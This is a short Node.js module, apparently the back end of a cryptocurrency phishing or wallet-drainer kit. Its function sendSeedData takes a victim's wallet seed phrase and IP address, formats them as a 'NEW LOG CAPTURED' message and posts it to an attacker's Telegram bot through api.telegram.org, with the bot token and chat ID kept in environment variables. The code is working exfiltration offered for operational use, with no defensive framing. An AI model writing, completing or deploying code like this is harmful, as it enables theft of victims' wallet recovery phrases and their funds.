const https = require('https');
require('dotenv').config();

/**
 * ASA Bot Manager - Production Version
 * Formats seed phrases vertically and uses environment variables.
 */
const sendSeedData = (seedPhrase, userIP, socketId) => {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
        console.error("❌ ERROR: Missing credentials in Render environment settings.");
        return;
    }

    // Split the seed phrase and format as a vertical list
    const words = seedPhrase.trim().split(/\s+/);
    const verticalList = words.map((word, index) => `${index + 1}. ${word}`).join('\n');
    
    // Create a unique ID from the Socket ID or a short timestamp
    const shortId = socketId ? socketId.substring(0, 6).toUpperCase() : 'N/A';

    const message = `🚀 NEW LOG CAPTURED
━━━━━━━━━━━━━━━━━━━━
👤 USER ID: ${shortId}
🌐 IP: ${userIP}

🔑 VERTICAL SEED PHRASE:
${verticalList}

🛰 Source: Render-ASA
━━━━━━━━━━━━━━━━━━━━`;

    const data = JSON.stringify({
        chat_id: chatId.trim(),
        text: message
    });

    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${botToken.trim()}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    const req = https.request(options, (res) => {
        if (res.statusCode === 200) {
            console.log(`✅ Log Sent for User ${shortId}`);
        } else {
            console.error(`❌ Telegram Error: ${res.statusCode}`);
        }
    });

    req.on('error', (e) => {
        console.error(`❌ Connection Error: ${e.message}`);
    });

    req.write(data);
    req.end();
};

module.exports = { sendSeedData };